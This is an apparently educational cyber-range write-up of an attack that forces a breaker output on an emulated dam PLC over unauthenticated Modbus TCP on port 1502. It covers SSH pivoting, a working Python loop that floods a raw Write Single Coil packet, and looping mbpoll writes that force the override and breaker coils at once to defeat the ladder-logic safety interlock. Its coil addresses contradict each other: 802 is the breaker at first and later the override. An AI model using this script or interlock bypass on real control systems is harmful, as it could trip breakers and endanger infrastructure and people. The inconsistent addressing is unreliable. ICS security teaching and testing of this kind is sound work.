# NYMEGA DAM PLC – Control Layer Exploitation Test

**Experiment:** Modbus TCP Breaker Manipulation  
**Environment:** NYMEGA ICS Cyber Range

---

# Overview

This experiment demonstrates a **control-layer exploitation scenario in an Industrial Control System (ICS)** using the **Modbus TCP protocol**.

The scenario simulates an **internal attacker who has gained network access** and attempts to manipulate a **breaker control output on a dam PLC** using **unauthenticated Modbus write commands**.

The experiment was conducted inside the **NYMEGA ICS cyber range environment**, where industrial components such as **PLCs, HMIs, and monitoring systems** are emulated to replicate real operational technology (OT) environments.

The goal was to observe how **protocol-level manipulation interacts with PLC ladder logic safety mechanisms**.

---

# Objective

The experiment aimed to:

- Validate exposure of **Modbus TCP services**
- Map **PLC memory variables to Modbus address space**
- Attempt **remote manipulation of control outputs**
- Observe **PLC ladder logic safety enforcement**

This scenario represents a **realistic ICS attack pathway** where an attacker pivots from the **enterprise IT network into the OT environment**.

---

# Environment

## Machines Involved

| Role | Machine | IP Address |
|-----|-----|-----|
| Attacker VM | nymega-cr-jacampora-pool-attacker-1 | 10.13.20.x |
| DAM PLC Host | nymega-dam-plc | 10.14.6.10 |
| Monitoring / HMI | Infra-SOC VM | OpenPLC UI (Port 8080) |

---

## Protocol Configuration

- **Protocol:** Modbus TCP  
- **Custom Port:** **TCP 1502**  
- **PLC Runtime:** **OpenPLC (Docker deployment)**

---

# Attack Pathway

## Step 1 — Initial Access

The attack begins from a **compromised workstation** located on a different subnet than the PLC network.

This simulates a **post-phishing foothold in the enterprise environment**.

The attacker machine represents a system where:

- Credentials have been compromised  
- Internal network access has been obtained  

---

## Step 2 — Target Identification

Through reconnaissance and network mapping, the attacker identified the **DAM PLC host**.

| Target System | IP Address |
|-----|-----|
| DAM PLC | 10.14.6.10 |

Services discovered on the host:

- **OpenPLC Runtime**
- **Modbus TCP service**
- **SSH (Port 22)**

---

## Step 3 — SSH Accessibility Verification

A port scan confirmed remote access availability.

```
nmap -p 22 10.14.6.10
```

Scan results:

```
22/tcp open ssh
```

This confirmed that the **PLC host was reachable through SSH**.

---

## Step 4 — Establishing Remote Access

Using discovered credentials, the attacker initiated an SSH session:

```
ssh student@10.14.6.10
```

Example shell prompt:

```
student@nymega-dam-plc:~$
```

This stage represents **lateral movement from the enterprise network into the OT environment**.

The scenario simulates:

- **Phishing-based credential compromise**
- **Credential reuse**
- **Pivoting into the OT network**
- **Internal access to a control system host**

SSH was used **only for system access**, not for the breaker manipulation itself.

---

## Step 5 — PLC Service Validation

Once access to the PLC host was obtained, the attacker verified that the **Modbus TCP service was running**.

Example commands:

```
nmap -p 1502 127.0.0.1
```

or

```
ss -tulnp | grep 1502
```

Both confirmed the **Modbus TCP service was active on port 1502**.

---

# Target Identification

Using the **OpenPLC monitoring interface**, the breaker output variable was identified.

| Variable | Address |
|-----|-----|
| fdBreakerStatus | %QX100.2 |

To interact with this variable through Modbus, the PLC memory location was converted to a **Modbus coil address**.

```
(100 × 8) + 2 = 802
```

Therefore:

**Breaker Control = Coil 802**

---

# Exploit Development

A custom Python script was developed to transmit **Modbus TCP write commands** targeting the breaker coil.

The script implemented **Modbus Function Code 05 (Write Single Coil)**.

## Breaker Manipulation Script

```python
import socket
import time

PLC_IP = "10.14.6.10"
PORT = 1502

packet = b'\x00\x01\x00\x00\x00\x06\x01\x05\x03\x22\xFF\x00'

while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((PLC_IP, PORT))
    s.send(packet)
    s.close()
    time.sleep(0.005)
```

---

## Packet Details

| Field | Value |
|-----|-----|
| Function Code | **05 (Write Single Coil)** |
| Coil Address | **0x0322 (Coil 802)** |
| Value | **0xFF00 (TRUE – Open Breaker)** |

The script continuously sent write commands attempting to force the breaker output to **TRUE**.

---

# Observed Behavior

Upon execution of the attack script:

- The breaker state briefly changed **FALSE → TRUE**
- Within milliseconds, the breaker returned **TRUE → FALSE**

This confirmed:

- **Modbus write access was successful**
- **PLC memory mapping to coil 802 was correct**
- **Protocol-level manipulation was functioning**

However, the breaker state **did not persist**.

---

# Ladder Logic Interlock Enforcement

Further investigation revealed that the reset behavior was caused by **ladder logic safety interlocks** implemented in the PLC program.

The ladder logic required the **Override signal** to be **TRUE** before the breaker output could remain TRUE.

These interlocks prevent **unsafe or unauthorized operations** unless required safety conditions are satisfied.

---

# Coil State Verification

The override coil was verified using the **mbpoll Modbus client**.

```
mbpoll -m tcp -a 1 -t0 -r 802 -c 1 10.14.6.10 -p 1502
```

Output:

```
[802]: 0
```

This indicated:

**Override = FALSE**

Because the override signal was disabled, the PLC ladder logic continuously forced the breaker back to **FALSE**.

---

# Coordinated Coil Manipulation

To bypass the interlock behavior, coordinated writes were attempted on both coils.

| Signal | Coil |
|-----|-----|
| Override | 802 |
| Breaker | 803 |

Example commands:

```
while true; do mbpoll -m tcp -a 1 -t0 -r 802 10.14.6.10 -p 1502 1; done
```

```
while true; do mbpoll -m tcp -a 1 -t0 -r 803 10.14.6.10 -p 1502 1; done
```

Because PLCs operate on **continuous scan cycles**, the following sequence occurs:

1. Breaker is written as **TRUE through Modbus**
2. PLC executes **ladder logic**
3. Ladder logic evaluates conditions
4. If **Override = FALSE**, breaker resets

Once **both signals were forced simultaneously**, the breaker state persisted.

---

# Security Findings

## Vulnerabilities Observed

- **Modbus TCP exposed without authentication**
- **Write operations permitted without access control**
- **No encryption for control commands**
- **Remote manipulation of control outputs possible**

---

## Mitigation Observed

- **PLC ladder logic enforced safety interlocks**
- **Output states could not persist without logical conditions**

---

# Conclusion

This experiment demonstrates that **internal network access can enable manipulation of industrial control protocols such as Modbus TCP**.

Key findings:

- PLC memory locations can be **accurately mapped and targeted**
- Control outputs can be **remotely manipulated**
- Ladder logic may **override unauthorized commands**
- Infrastructure configuration such as **non-standard ports (1502)** must be identified before exploitation

Although the breaker state could not initially be permanently altered due to ladder logic safety controls, the experiment confirmed that **protocol-layer exploitation is feasible once an attacker gains internal access to the OT network**.

---

# Security Recommendations

To mitigate similar risks in industrial environments:

- Implement **network segmentation between IT and OT networks**
- Apply **access controls for Modbus write operations**
- Monitor **Modbus Function Code 05 activity**
- Deploy **ICS intrusion detection systems**
- Restrict **direct access to PLC hosts**

- 
---

##  Disclaimer
This project is for **educational and defensive security research only**. No real-world systems were targeted.

---
## ❤️ Author

Created by **Jeytha Sahana** 
